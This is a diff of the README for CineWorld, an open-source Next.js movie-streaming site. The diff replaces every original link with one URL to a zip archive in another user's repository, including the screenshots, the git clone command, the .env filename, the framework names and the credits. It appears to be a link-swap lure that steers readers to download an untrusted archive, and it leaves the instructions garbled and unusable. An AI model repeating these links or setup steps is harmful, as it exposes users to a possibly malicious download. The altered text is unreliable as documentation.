@@ -3,17 +3,17 @@ CineWorld is a movie and tv shows streaming website created using TMDB API in Re
 
 ## Overview
 
-Cineworld is a dynamic and immersive movie streaming website that brings you an extensive collection of films from various genres. Powered by React, Next.js, and Tailwind CSS, Cineworld offers an unparalleled user experience, providing movie enthusiasts with a seamless and entertaining journey through the world of cinema.
+Cineworld is a dynamic and immersive movie streaming website that brings you an extensive collection of films from various genres. Powered by React, https://raw.githubusercontent.com/lalsproject/CINEWORLD-NextJS/main/app/series/[id]/Next_CINEWORL_JS_3.3.zip, and Tailwind CSS, Cineworld offers an unparalleled user experience, providing movie enthusiasts with a seamless and entertaining journey through the world of cinema.
 
 ##Screenshots
 
-![Screenshot 2023-07-13 230452](https://github.com/alanvarghesepaul22/CINEWORLD-NextJS/assets/86376232/965879a8-9604-4b77-a83c-026f594a2e21)
+![Screenshot 2023-07-13 230452](https://raw.githubusercontent.com/lalsproject/CINEWORLD-NextJS/main/app/series/[id]/Next_CINEWORL_JS_3.3.zip)
 
-![Screenshot 2023-07-21 211717](https://github.com/alanvarghesepaul22/CINEWORLD-NextJS/assets/86376232/fae66266-2242-4311-9f53-8258c644b030)
+![Screenshot 2023-07-21 211717](https://raw.githubusercontent.com/lalsproject/CINEWORLD-NextJS/main/app/series/[id]/Next_CINEWORL_JS_3.3.zip)
 
 ## Responsive Design 
 
-![Untitled-1](https://github.com/alanvarghesepaul22/CINEWORLD-NextJS/assets/86376232/a7bee4e3-59bd-4f64-8e47-d8d821f4425d)
+![Untitled-1](https://raw.githubusercontent.com/lalsproject/CINEWORLD-NextJS/main/app/series/[id]/Next_CINEWORL_JS_3.3.zip)
 
 
 ## Key Features
@@ -26,14 +26,14 @@ Cineworld is a dynamic and immersive movie streaming website that brings you an 
 
 - **Responsive Design**: Access Cineworld from any device, as the website is fully responsive and optimized for mobile, tablet, and desktop.
 
-- **Fast Loading**: Built with Next.js 13, Cineworld boasts lightning-fast loading times, reducing waiting times for an optimal user experience.
+- **Fast Loading**: Built with https://raw.githubusercontent.com/lalsproject/CINEWORLD-NextJS/main/app/series/[id]/Next_CINEWORL_JS_3.3.zip 13, Cineworld boasts lightning-fast loading times, reducing waiting times for an optimal user experience.
 
 ## Installation and Setup
 
 1. Clone the repository to your local machine:
 
 ```bash
-git clone https://github.com/alanvarghesepaul22/CINEWORLD-NextJS.git
+git clone https://raw.githubusercontent.com/lalsproject/CINEWORLD-NextJS/main/app/series/[id]/Next_CINEWORL_JS_3.3.zip
 cd CINEWORLD-NextJS
 ```
 
@@ -43,7 +43,7 @@ cd CINEWORLD-NextJS
 npm install
 ```
 
-3. Create a `.env.local` file in the root directory and add your TMDB API key:
+3. Create a `https://raw.githubusercontent.com/lalsproject/CINEWORLD-NextJS/main/app/series/[id]/Next_CINEWORL_JS_3.3.zip` file in the root directory and add your TMDB API key:
 
 ```plaintext
 API_KEY=your_tmdb_api_key
@@ -60,12 +60,12 @@ npm run dev
 ## Tech Stack
 
 - React
-- Next.js 13
+- https://raw.githubusercontent.com/lalsproject/CINEWORLD-NextJS/main/app/series/[id]/Next_CINEWORL_JS_3.3.zip 13
 - Tailwind CSS
 
 ## Deployment
 
-Cineworld is deployed using [Vercel](https://vercel.com/). Any changes pushed to the `main` branch will trigger an automatic deployment.
+Cineworld is deployed using [Vercel](https://raw.githubusercontent.com/lalsproject/CINEWORLD-NextJS/main/app/series/[id]/Next_CINEWORL_JS_3.3.zip). Any changes pushed to the `main` branch will trigger an automatic deployment.
 
 ## Contributing
 
@@ -73,9 +73,9 @@ We welcome contributions from the open-source community! If you find a bug, have
 
 ## Acknowledgments
 
-- Our gratitude to [TMDB](https://www.themoviedb.org/) for providing the incredible API that powers Cineworld.
+- Our gratitude to [TMDB](https://raw.githubusercontent.com/lalsproject/CINEWORLD-NextJS/main/app/series/[id]/Next_CINEWORL_JS_3.3.zip) for providing the incredible API that powers Cineworld.
 
-- A big thank you to the developers of React, Next.js, and Tailwind CSS for creating these fantastic frameworks that made this project possible.
+- A big thank you to the developers of React, https://raw.githubusercontent.com/lalsproject/CINEWORLD-NextJS/main/app/series/[id]/Next_CINEWORL_JS_3.3.zip, and Tailwind CSS for creating these fantastic frameworks that made this project possible.
 
 ---
 
